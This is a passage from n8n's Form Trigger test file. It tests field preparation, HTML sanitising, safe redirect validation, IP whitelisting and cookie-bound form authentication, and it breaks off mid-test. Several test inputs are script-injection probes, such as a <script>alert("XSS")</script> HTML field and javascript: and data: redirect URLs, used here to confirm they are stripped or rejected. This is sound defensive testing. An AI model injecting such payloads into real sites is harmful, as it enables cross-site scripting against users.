			'={{name}} ({{age}}) knows {{languages.length}} languages. First project: {{projects.0.name}}.';
		expect(resolveRawData(mockContext, input)).toBe(
			'Hanna (30) knows 2 languages. First project: Project A.',
		);
	});

	it('should handle nested array access', () => {
		const input = '=First hobby: {{hobbies.0}}, Last hobby: {{hobbies.2}}.';
		expect(resolveRawData(mockContext, input)).toBe('First hobby: reading, Last hobby: coding.');
	});

	it('should handle object-to-string conversion', () => {
		const input = '=Address object: {{address}}.';
		expect(resolveRawData(mockContext, input)).toBe(
			'Address object: {"street":"123 Main St","zipCode":"10001","country":"USA"}.',
		);
	});
});

describe('FormTrigger, isFormConnected', () => {
	it('should return false if Wait node is connected but resume parameter is not form', async () => {
		const result = isFormConnected([
			mock<NodeTypeAndVersion>({
				type: 'n8n-nodes-base.wait',
				parameters: {
					resume: 'timeInterval',
				},
			}),
		]);
		expect(result).toBe(false);
	});
	it('should return true if Wait node is connected and resume parameter is form', async () => {
		const result = isFormConnected([
			mock<NodeTypeAndVersion>({
				type: 'n8n-nodes-base.wait',
				parameters: {
					resume: 'form',
				},
			}),
		]);
		expect(result).toBe(true);
	});
	it('should return true if Form node is connected', async () => {
		const result = isFormConnected([
			mock<NodeTypeAndVersion>({
				type: 'n8n-nodes-base.form',
			}),
		]);
		expect(result).toBe(true);
	});
});

describe('validateResponseModeConfiguration', () => {
	let webhookFunctions: ReturnType<typeof mock<IWebhookFunctions>>;

	beforeEach(() => {
		webhookFunctions = mock<IWebhookFunctions>();

		webhookFunctions.getNode.mockReturnValue({
			name: 'TestNode',
			typeVersion: 2.2,
		} as INode);

		webhookFunctions.getChildNodes.mockReturnValue([]);
	});

	test('throws error if responseMode is "responseNode" but no Respond to Webhook node is connected', () => {
		webhookFunctions.getNodeParameter.mockReturnValue('responseNode');

		expect(() => validateResponseModeConfiguration(webhookFunctions)).toThrow(
			'No Respond to Webhook node found in the workflow',
		);
	});

	test('throws error if "Respond to Webhook" node is connected but "responseMode" is not "responseNode" in typeVersion <= 2.1', () => {
		webhookFunctions.getNodeParameter.mockReturnValue('onReceived');
		webhookFunctions.getNode.mockReturnValue({
			name: 'TestNode',
			typeVersion: 2.1,
		} as INode);
		webhookFunctions.getChildNodes.mockReturnValue([
			{ type: 'n8n-nodes-base.respondToWebhook' } as NodeTypeAndVersion,
		]);

		expect(() => validateResponseModeConfiguration(webhookFunctions)).toThrow(
			'Unused Respond to Webhook node found in the workflow',
		);
	});

	test('throws error if "Respond to Webhook" node is connected, version >= 2.2', () => {
		webhookFunctions.getNodeParameter.mockReturnValue('responseNode');
		webhookFunctions.getChildNodes.mockReturnValue([
			{ type: 'n8n-nodes-base.respondToWebhook' } as NodeTypeAndVersion,
		]);

		expect(() => validateResponseModeConfiguration(webhookFunctions)).toThrow(
			'The "Respond to Webhook" node is not supported in workflows initiated by the "n8n Form Trigger"',
		);
	});

	test('does not throw an error mode in not "responseNode" and no "Respond to Webhook" node is connected', () => {
		webhookFunctions.getNodeParameter.mockReturnValue('onReceived');

		expect(() => validateResponseModeConfiguration(webhookFunctions)).not.toThrow();
	});

	describe('prepareFormFields', () => {
		it('should prepare hiddenField', async () => {
			const result = prepareFormFields([
				{
					fieldLabel: '',
					fieldName: 'test',
					fieldType: 'hiddenField',
				},
			]);

			expect(result[0]).toEqual({
				fieldLabel: 'test',
				fieldName: 'test',
				fieldType: 'hiddenField',
			});
		});

		it('should sanitize html fields', async () => {
			const result = prepareFormFields([
				{
					fieldLabel: 'Custom HTML',
					fieldType: 'html',
					elementName: 'test',
					html: '<div>Safe content</div><script>alert("XSS")</script>',
				},
			]);

			expect(result[0].html).toBe('<div>Safe content</div>');
		});

		it('should not modify html fields when html is empty', async () => {
			const result = prepareFormFields([
				{
					fieldLabel: 'Custom HTML',
					fieldType: 'html',
					elementName: 'test',
					html: '',
				},
			]);

			expect(result[0].html).toBe('');
		});

		it('should not modify html fields when html is undefined', async () => {
			const result = prepareFormFields([
				{
					fieldLabel: 'Custom HTML',
					fieldType: 'html',
					elementName: 'test',
				},
			]);

			expect(result[0].html).toBeUndefined();
		});

		it('should not process non-html fields', async () => {
			const result = prepareFormFields([
				{
					fieldLabel: 'Text Field',
					fieldType: 'text',
				},
			]);

			expect(result[0]).toEqual({
				fieldLabel: 'Text Field',
				fieldType: 'text',
			});
		});
	});
});

describe('addFormResponseDataToReturnItem', () => {
	let returnItem: INodeExecutionData;

	beforeEach(() => {
		returnItem = { json: {} };
	});

	test('should use fieldName if fieldLabel is missing', () => {
		const formFields: FormFieldsParameter = [
			{ fieldName: 'Alternative Field', fieldType: 'hiddenField' },
		] as FormFieldsParameter;
		const bodyData: IDataObject = { 'field-0': 'Test Value' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Alternative Field']).toBe('Test Value');
	});

	it('should handle null values', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Test Field', fieldType: 'text' }];
		const bodyData: IDataObject = {};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Test Field']).toBeNull();
	});

	it('should process html fields and set elementName', () => {
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'HTML Field', elementName: 'htmlElement', fieldType: 'html' },
		];
		const bodyData: IDataObject = { 'field-0': '<p>HTML Content</p>' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json.htmlElement).toBe('<p>HTML Content</p>');
	});

	it('should parse number fields correctly', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Number Field', fieldType: 'number' }];
		const bodyData: IDataObject = { 'field-0': '42' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Number Field']).toBe(42);
	});

	it('should trim text fields correctly', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Text Field', fieldType: 'text' }];
		const bodyData: IDataObject = { 'field-0': '   some text   ' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Text Field']).toBe('some text');
	});

	it('should trim email fields correctly', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Email Field', fieldType: 'email' }];
		const bodyData: IDataObject = { 'field-0': ' test@example.com   ' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Email Field']).toBe('test@example.com');
	});

	it('should trim text fields', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Text Field', fieldType: 'text' }];
		const bodyData: IDataObject = { 'field-0': '   hello world   ' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Text Field']).toBe('hello world');
	});

	it('should parse radio field from JSON', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Radio Field', fieldType: 'radio' }];
		const bodyData: IDataObject = { 'field-0': '["option1"]' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Radio Field']).toEqual('option1');
	});

	it('should parse checkboxes fields from JSON', () => {
		const formFields: FormFieldsParameter = [{ fieldLabel: 'Checkboxes', fieldType: 'checkbox' }];
		const bodyData: IDataObject = { 'field-0': '["option1", "option2"]' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Checkboxes']).toEqual(['option1', 'option2']);
	});

	it('should parse multiselect fields from JSON', () => {
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Multi Field', fieldType: 'text', multiselect: true },
		];
		const bodyData: IDataObject = { 'field-0': '["option1", "option2"]' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['Multi Field']).toEqual(['option1', 'option2']);
	});

	it('should convert single file values to an array if multipleFiles is true', () => {
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'File Field', fieldType: 'file', multipleFiles: true },
		];
		const bodyData: IDataObject = { 'field-0': 'file1.pdf' };

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
		expect(returnItem.json['File Field']).toEqual(['file1.pdf']);
	});

	describe('Version 2.4+ fieldName support', () => {
		it('should use fieldName for output data keys in v2.4+', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const bodyData: IDataObject = { 'field-0': 'John Doe' };

			addFormResponseDataToReturnItem(returnItem, formFields, bodyData, 2.4);

			expect(returnItem.json.userName).toBe('John Doe');
			expect(returnItem.json['User Name']).toBeUndefined();
		});

		it('should use fieldLabel for output data keys in v2.3 and earlier', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const bodyData: IDataObject = { 'field-0': 'John Doe' };

			addFormResponseDataToReturnItem(returnItem, formFields, bodyData, 2.3);

			expect(returnItem.json['User Name']).toBe('John Doe');
			expect(returnItem.json.userName).toBeUndefined();
		});

		it('should fallback to fieldLabel if fieldName is missing in v2.4+', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const bodyData: IDataObject = { 'field-0': 'John Doe' };

			addFormResponseDataToReturnItem(returnItem, formFields, bodyData, 2.4);

			expect(returnItem.json['User Name']).toBe('John Doe');
		});

		it('should handle multiple fields with fieldName in v2.4+', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldName: 'firstName',
					fieldLabel: 'First Name',
					fieldType: 'text',
				},
				{
					fieldName: 'lastName',
					fieldLabel: 'Last Name',
					fieldType: 'text',
				},
				{
					fieldName: 'email',
					fieldLabel: 'Email Address',
					fieldType: 'email',
				},
			];
			const bodyData: IDataObject = {
				'field-0': 'John',
				'field-1': 'Doe',
				'field-2': 'john@example.com',
			};

			addFormResponseDataToReturnItem(returnItem, formFields, bodyData, 2.4);

			expect(returnItem.json.firstName).toBe('John');
			expect(returnItem.json.lastName).toBe('Doe');
			expect(returnItem.json.email).toBe('john@example.com');
			expect(returnItem.json['First Name']).toBeUndefined();
			expect(returnItem.json['Last Name']).toBeUndefined();
			expect(returnItem.json['Email Address']).toBeUndefined();
		});
	});
});

describe('validateSafeRedirectUrl', () => {
	it('should return null for undefined input', () => {
		expect(validateSafeRedirectUrl(undefined)).toBeNull();
	});

	it('should return null for empty string', () => {
		expect(validateSafeRedirectUrl('')).toBeNull();
		expect(validateSafeRedirectUrl('   ')).toBeNull();
	});

	it('should return valid http/https URLs', () => {
		expect(validateSafeRedirectUrl('https://example.com')).toBe('https://example.com');
		expect(validateSafeRedirectUrl('http://example.com/path')).toBe('http://example.com/path');
	});

	it('should add https:// prefix to URLs without protocol', () => {
		expect(validateSafeRedirectUrl('example.com')).toBe('https://example.com');
		expect(validateSafeRedirectUrl('example.com/path')).toBe('https://example.com/path');
	});

	it('should trim whitespace from URLs', () => {
		expect(validateSafeRedirectUrl('  https://example.com  ')).toBe('https://example.com');
	});

	it('should return null for javascript: URLs', () => {
		expect(validateSafeRedirectUrl('javascript:alert(1)')).toBeNull();
	});

	it('should return null for data: URLs', () => {
		expect(validateSafeRedirectUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
	});

	it('should return null for invalid URLs', () => {
		expect(validateSafeRedirectUrl('not a valid url')).toBeNull();
	});
});

describe('FormTrigger, prepareFormData - Default Value', () => {
	it('should use defaultValue when no query parameter is provided', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				placeholder: 'Enter your name',
				defaultValue: 'John Doe',
			},
			{
				fieldLabel: 'Email',
				fieldType: 'email',
				requiredField: true,
				placeholder: 'Enter your email',
				defaultValue: 'john@example.com',
			},
		];

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query: {},
		});

		expect(result.formFields[0].defaultValue).toBe('John Doe');
		expect(result.formFields[1].defaultValue).toBe('john@example.com');
	});

	it('should prioritize query parameter over defaultValue', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				defaultValue: 'Default Name',
			},
		];

		const query = { Name: 'Query Name' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].defaultValue).toBe('Query Name');
	});

	it('should use empty string when neither defaultValue nor query parameter is provided', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
			},
		];

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query: {},
		});

		expect(result.formFields[0].defaultValue).toBe('');
	});
});

describe('FormTrigger IP Whitelist', () => {
	describe('isIpAllowed (reused from Webhook)', () => {
		it('should return true if whitelist is undefined', () => {
			expect(isIpAllowed(undefined, ['192.168.1.1'], '192.168.1.1')).toBe(true);
		});

		it('should return true if whitelist is an empty string', () => {
			expect(isIpAllowed('', ['192.168.1.1'], '192.168.1.1')).toBe(true);
		});

		it('should allow IP in whitelist', () => {
			expect(isIpAllowed('192.168.1.1', [], '192.168.1.1')).toBe(true);
		});

		it('should block IP not in whitelist', () => {
			expect(isIpAllowed('192.168.1.1', [], '192.168.1.2')).toBe(false);
		});

		it('should support CIDR notation', () => {
			expect(isIpAllowed('192.168.1.0/24', [], '192.168.1.50')).toBe(true);
			expect(isIpAllowed('192.168.1.0/24', [], '192.168.2.1')).toBe(false);
		});

		it('should support comma-separated mixed entries', () => {
			expect(isIpAllowed('127.0.0.1, 192.168.1.0/24', [], '192.168.1.100')).toBe(true);
			expect(isIpAllowed('127.0.0.1, 192.168.1.0/24', [], '10.0.0.1')).toBe(false);
		});

		it('should handle IPv6 addresses', () => {
			expect(isIpAllowed('::1', [], '::1')).toBe(true);
			expect(isIpAllowed('::1', [], '::2')).toBe(false);
		});

		it('should check both direct IP and proxy IPs', () => {
			expect(isIpAllowed('192.168.1.1', ['192.168.1.1', '10.0.0.1'], '10.0.0.2')).toBe(true);
		});
	});
});

describe('handleNewlines', () => {
	it.each([
		['\\n', '\n'], // \n => newline character
		['\\\\n', '\\n'], // \\n => \n
		['\\\\\\n', '\\\\n'], // \\\n => \\n
	])('should replace %j with %j in text', (pattern, replacement) => {
		const text = `Some message${pattern}Other text`;
		const expected = `Some message${replacement}Other text`;

		const result = handleNewlines(text);

		expect(result).toBe(expected);
	});
});

describe('parseFormFields - HTML field expression resolution', () => {
	let mockWebhookFunctions: ReturnType<typeof mock<IWebhookFunctions>>;

	beforeEach(() => {
		mockWebhookFunctions = mock<IWebhookFunctions>();
	});

	it('should resolve expressions in html fields', () => {
		mockWebhookFunctions.getNodeParameter.mockImplementation((paramName: string) => {
			if (paramName === 'formFields.values') {
				return [
					{
						fieldLabel: 'Custom HTML',
						fieldType: 'html',
						elementName: 'test',
						html: '<h1>{{ $json.formMode }}</h1>',
					},
				];
			}
			return undefined;
		});

		mockWebhookFunctions.evaluateExpression.mockImplementation((expression: string) => {
			if (expression === '{{ $json.formMode }}') {
				return 'Title';
			}
			if (expression.includes('formMode')) {
				return 'test';
			}
			return expression;
		});

		const result = parseFormFields(mockWebhookFunctions, {
			defineForm: 'fields',
			fieldsParameterName: 'formFields.values',
		});

		expect(mockWebhookFunctions.evaluateExpression).toHaveBeenCalledWith('{{ $json.formMode }}');
		expect(result[0].html).toBe('<h1>Title</h1>');
	});

	it('should handle multiple expressions in html fields', () => {
		mockWebhookFunctions.getNodeParameter.mockImplementation((paramName: string) => {
			if (paramName === 'formFields.values') {
				return [
					{
						fieldLabel: 'Custom HTML',
						fieldType: 'html',
						elementName: 'test',
						html: '<h1>{{ $json.title }}</h1><p>{{ $json.description }}</p>',
					},
				];
			}
			return undefined;
		});

		mockWebhookFunctions.evaluateExpression.mockImplementation((expression: string) => {
			if (expression === '{{ $json.title }}') return 'Welcome';
			if (expression === '{{ $json.description }}') return 'Please fill out the form';
			if (expression.includes('formMode')) {
				return 'test';
			}
			return expression;
		});

		const result = parseFormFields(mockWebhookFunctions, {
			defineForm: 'fields',
			fieldsParameterName: 'formFields.values',
		});

		expect(result[0].html).toBe('<h1>Welcome</h1><p>Please fill out the form</p>');
	});

	it('should not modify html fields without expressions', () => {
		mockWebhookFunctions.getNodeParameter.mockImplementation((paramName: string) => {
			if (paramName === 'formFields.values') {
				return [
					{
						fieldLabel: 'Custom HTML',
						fieldType: 'html',
						elementName: 'test',
						html: '<h1>Static Title</h1>',
					},
				];
			}
			return undefined;
		});

		mockWebhookFunctions.evaluateExpression.mockImplementation((expression: string) => {
			if (expression.includes('formMode')) {
				return 'test';
			}
			return expression;
		});

		const result = parseFormFields(mockWebhookFunctions, {
			defineForm: 'fields',
			fieldsParameterName: 'formFields.values',
		});

		expect(result[0].html).toBe('<h1>Static Title</h1>');
	});

	it('should handle empty html fields', () => {
		mockWebhookFunctions.getNodeParameter.mockImplementation((paramName: string) => {
			if (paramName === 'formFields.values') {
				return [
					{
						fieldLabel: 'Custom HTML',
						fieldType: 'html',
						elementName: 'test',
						html: '',
					},
				];
			}
			return undefined;
		});

		mockWebhookFunctions.evaluateExpression.mockImplementation((expression: string) => {
			if (expression.includes('formMode')) {
				return 'test';
			}
			return expression;
		});

		const result = parseFormFields(mockWebhookFunctions, {
			defineForm: 'fields',
			fieldsParameterName: 'formFields.values',
		});

		expect(result[0].html).toBe('');
	});
});

describe('validateFormPageAuth', () => {
	const authedUser = {
		id: 'user-1',
		email: 'user@example.com',
		firstName: 'Test',
		lastName: 'User',
	};

	const pageNode = { id: 'page-node', webhookId: 'page-webhook' } as INode;
	const WORKFLOW_ID = 'workflow-1';
	const EXECUTION_ID = 'exec-id';

	const buildContext = (method: 'GET' | 'POST', cookie?: string) => {
		const res = {
			writeHead: vi.fn(),
			end: vi.fn(),
			setHeader: vi.fn(),
			status: vi.fn().mockReturnValue({ send: vi.fn() }),
		};
		const req: {
			method: string;
			originalUrl: string;
			headers: Record<string, string>;
			protocol: string;
		} = {
			method,
			originalUrl: '/form-waiting/exec-id',
			headers: {
				host: 'localhost:5678',
				...(cookie ? { cookie } : {}),
			},
			protocol: 'http',
		};
		const ctx = mock<IWebhookFunctions>();
		ctx.getRequestObject.mockReturnValue(req as unknown as Request);
		ctx.getResponseObject.mockReturnValue(res as never);
		ctx.getNode.mockReturnValue(pageNode);
		ctx.getWorkflow.mockReturnValue({ id: WORKFLOW_ID, name: 'wf', active: true });
		ctx.getExecutionId.mockReturnValue(EXECUTION_ID);
		return { ctx, res, req };
	};

	/** The name a page render gives the cookie: bound to the run, or — from the
	 * trigger, before a run exists — to the workflow. */
	const formAuthCookieName = (binding: { workflowId?: string; executionId?: string }) =>
		binding.executionId
			? `n8n-form-auth-ex-${binding.executionId}`
			: `n8n-form-auth-wf-${binding.workflowId}`;

	/** The cookie the form pages present, as the page renders set it. An explicit
	 * `cookieName` mimics a stale or foreign token sitting under a name the served
	 * page looks for. */
	const pageAuthCookie = (
		binding: { workflowId?: string; executionId?: string },
		cookieName = formAuthCookieName(binding),
	) => `${cookieName}=${generateFormUserAuthToken(pageNode, authedUser, binding)}`;

	it('returns empty object and skips validation when authentication is not n8nUserAuth', async () => {
		const { ctx } = buildContext('GET');

		const result = await validateFormPageAuth(ctx, 'none');

		expect(result).toEqual({});
		expect(ctx.validateCookieAuth).not.toHaveBeenCalled();
	});

	it('responds with 302 redirect to /signin on GET when no cookie is present, using an absolute URL', async () => {
		const { ctx, res } = buildContext('GET');

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(res.writeHead).toHaveBeenCalledWith(302, {
			Location:
				'/signin?redirect=' + encodeURIComponent('http://localhost:5678/form-waiting/exec-id'),
		});
		expect(res.end).toHaveBeenCalled();
		expect(result.responded).toBe(true);
		expect(result.authedUser).toBeUndefined();
	});

	it('honours x-forwarded-proto/host when building the redirect URL', async () => {
		const { ctx, res, req } = buildContext('GET');
		Object.assign(req.headers, {
			'x-forwarded-proto': 'https',
			'x-forwarded-host': 'forms.example.com',
		});
		ctx.getHeaderData.mockReturnValue(req.headers);

		await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(res.writeHead).toHaveBeenCalledWith(302, {
			Location:
				'/signin?redirect=' + encodeURIComponent('https://forms.example.com/form-waiting/exec-id'),
		});
	});

	it('responds with 401 on POST when no cookie is present', async () => {
		const send = vi.fn();
		const { ctx, res } = buildContext('POST');
		res.status.mockReturnValue({ send });

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(res.setHeader).toHaveBeenCalledWith(
			'WWW-Authenticate',
			'Basic realm="Enter credentials"',
		);
		expect(res.status).toHaveBeenCalledWith(401);
		expect(send).toHaveBeenCalled();
		expect(result.responded).toBe(true);
	});

	it('responds with 302 redirect when cookie is invalid on GET', async () => {
		const { ctx, res } = buildContext('GET', 'n8n-auth=bad.token');
		ctx.validateCookieAuth.mockRejectedValue(new Error('Unauthorized'));

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(ctx.validateCookieAuth).toHaveBeenCalledWith('bad.token');
		expect(res.writeHead).toHaveBeenCalledWith(
			302,
			expect.objectContaining({ Location: expect.stringContaining('/signin?redirect=') }),
		);
		expect(result.responded).toBe(true);
	});

	it('returns the authedUser when cookie validates', async () => {
		const { ctx } = buildContext('GET', 'n8n-auth=valid.jwt.token');
		ctx.validateCookieAuth.mockResolvedValue(authedUser);

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(ctx.validateCookieAuth).toHaveBeenCalledWith('valid.jwt.token');
		expect(result.authedUser).toEqual(authedUser);
		expect(result.responded).toBeFalsy();
	});

	it('parses n8n-auth alongside other cookies', async () => {
		const { ctx } = buildContext('GET', 'other=value; n8n-auth=valid.jwt.token; another=thing');
		ctx.validateCookieAuth.mockResolvedValue(authedUser);

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(ctx.validateCookieAuth).toHaveBeenCalledWith('valid.jwt.token');
		expect(result.authedUser).toEqual(authedUser);
	});

	it('falls back to the x-auth-token header when no cookie is present', async () => {
		const node = { id: 'node-1', webhookId: 'webhook-1' } as INode;
		const authedFormUser = {
			id: 'user-1',
			email: 'user@example.com',
			firstName: 'Test',
			lastName: 'User',
		};
		const token = generateFormUserAuthToken(node, authedFormUser, {
			workflowId: WORKFLOW_ID,
			executionId: EXECUTION_ID,
		});

		const res = {
			writeHead: vi.fn(),
			end: vi.fn(),
			setHeader: vi.fn(),
			status: vi.fn().mockReturnValue({ send: vi.fn() }),
		};
		const req = {
			method: 'POST',
			originalUrl: '/form-waiting/exec-id',
			headers: { host: 'localhost:5678', 'x-auth-token': token },
			protocol: 'http',
		};
		const ctx = mock<IWebhookFunctions>();
		ctx.getRequestObject.mockReturnValue(req as unknown as Request);
		ctx.getResponseObject.mockReturnValue(res as never);
		ctx.getNode.mockReturnValue(node);
		ctx.getExecutionId.mockReturnValue(EXECUTION_ID);

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(result.authedUser).toEqual(authedFormUser);
		expect(result.responded).toBeFalsy();
		// cookie path wasn't attempted because there's no cookie
		expect(ctx.validateCookieAuth).not.toHaveBeenCalled();
	});

	// A page is reached by navigating to it, which can attach no header — and, from a
	// sandboxed form document, no session cookie either. The form page auth cookie is
	// the only credential such a request carries.
	describe('form page auth cookie', () => {
		it('returns the authedUser from a cookie minted before the run started', async () => {
			const { ctx } = buildContext('GET', pageAuthCookie({ workflowId: WORKFLOW_ID }));

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
			expect(result.responded).toBeFalsy();
			expect(ctx.validateCookieAuth).not.toHaveBeenCalled();
		});

		it('returns the authedUser from a cookie bound to the execution being served', async () => {
			const { ctx } = buildContext(
				'GET',
				pageAuthCookie({ workflowId: WORKFLOW_ID, executionId: EXECUTION_ID }),
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
		});

		it('parses the cookie alongside other cookies', async () => {
			const { ctx } = buildContext(
				'GET',
				`other=value; ${pageAuthCookie({ workflowId: WORKFLOW_ID })}; another=thing`,
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
		});

		it("selects this form's cookies among other forms' cookies", async () => {
			// Each form journey names its cookie after its own run/workflow, so several
			// can sit in the browser side by side without overwriting one another.
			const { ctx } = buildContext(
				'GET',
				[
					pageAuthCookie({ workflowId: 'other-workflow' }),
					pageAuthCookie({ workflowId: WORKFLOW_ID, executionId: 'other-execution' }),
					pageAuthCookie({ workflowId: WORKFLOW_ID, executionId: EXECUTION_ID }),
				].join('; '),
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
		});

		it('ignores a token bound to another workflow sitting under the expected name', async () => {
			const { ctx, res } = buildContext(
				'GET',
				pageAuthCookie(
					{ workflowId: 'other-workflow' },
					formAuthCookieName({ workflowId: WORKFLOW_ID }),
				),
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(
				302,
				expect.objectContaining({ Location: expect.stringContaining('/signin?redirect=') }),
			);
		});

		it('ignores a token bound to another execution sitting under the expected name', async () => {
			const { ctx, res } = buildContext(
				'GET',
				pageAuthCookie(
					{ workflowId: WORKFLOW_ID, executionId: 'other-execution' },
					formAuthCookieName({ workflowId: WORKFLOW_ID, executionId: EXECUTION_ID }),
				),
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(302, expect.any(Object));
		});

		it('ignores a token that carries no workflow binding', async () => {
			const { ctx, res } = buildContext(
				'GET',
				pageAuthCookie({}, formAuthCookieName({ workflowId: WORKFLOW_ID })),
			);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(302, expect.any(Object));
		});

		it('ignores an expired cookie', async () => {
			const realNow = Date.now();
			vi.useFakeTimers();
			let cookie: string;
			try {
				vi.setSystemTime(realNow - 2 * 60 * 60 * 1000);
				cookie = pageAuthCookie({ workflowId: WORKFLOW_ID });
			} finally {
				vi.useRealTimers();
			}
			const { ctx, res } = buildContext('GET', cookie);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(302, expect.any(Object));
		});

		it('ignores a malformed cookie', async () => {
			const { ctx, res } = buildContext('GET', 'n8n-form-auth-ex-exec-id=garbage');

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(302, expect.any(Object));
		});

		it('falls back to the session cookie when the form cookie does not verify', async () => {
			const { ctx } = buildContext(
				'GET',
				'n8n-form-auth-ex-exec-id=garbage; n8n-auth=valid.jwt.token',
			);
			ctx.validateCookieAuth.mockResolvedValue(authedUser);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(ctx.validateCookieAuth).toHaveBeenCalledWith('valid.jwt.token');
			expect(result.authedUser).toEqual(authedUser);
		});

		// A value that isn't valid percent-encoding must be treated as no cookie, not
		// surface as a failed request for every page load that carries it.
		it('falls back to the session cookie when the form cookie value cannot be decoded', async () => {
			const { ctx } = buildContext(
				'GET',
				'n8n-form-auth-ex-exec-id=%E0%A4%A; n8n-auth=valid.jwt.token',
			);
			ctx.validateCookieAuth.mockResolvedValue(authedUser);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(ctx.validateCookieAuth).toHaveBeenCalledWith('valid.jwt.token');
			expect(result.authedUser).toEqual(authedUser);
		});

		it('redirects rather than throwing when an undecodable cookie is all the request has', async () => {
			const { ctx, res } = buildContext('GET', 'n8n-form-auth-ex-exec-id=%E0%A4%A');

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.responded).toBe(true);
			expect(res.writeHead).toHaveBeenCalledWith(302, expect.any(Object));
		});

		// The same browser can be signed out and signed back in as someone else while a
		// form is open; the live session decides who the page is served to.
		it("discards the cookie when the request also carries a different user's session", async () => {
			const otherUser = {
				id: 'user-2',
				email: 'other@example.com',
				firstName: 'Other',
				lastName: 'User',
			};
			const { ctx } = buildContext(
				'GET',
				`${pageAuthCookie({ workflowId: WORKFLOW_ID })}; n8n-auth=valid.jwt.token`,
			);
			ctx.validateCookieAuth.mockResolvedValue(otherUser);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(otherUser);
		});

		it('keeps the cookie when the session belongs to the same user', async () => {
			const { ctx } = buildContext(
				'GET',
				`${pageAuthCookie({ workflowId: WORKFLOW_ID })}; n8n-auth=valid.jwt.token`,
			);
			ctx.validateCookieAuth.mockResolvedValue(authedUser);

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
			expect(result.responded).toBeFalsy();
		});

		it('keeps the cookie when the session alongside it no longer validates', async () => {
			const { ctx } = buildContext(
				'GET',
				`${pageAuthCookie({ workflowId: WORKFLOW_ID })}; n8n-auth=stale.jwt.token`,
			);
			ctx.validateCookieAuth.mockRejectedValue(new Error('Unauthorized'));

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
			expect(result.responded).toBeFalsy();
		});

		it('is not consulted on POST, which carries the token in a header', async () => {
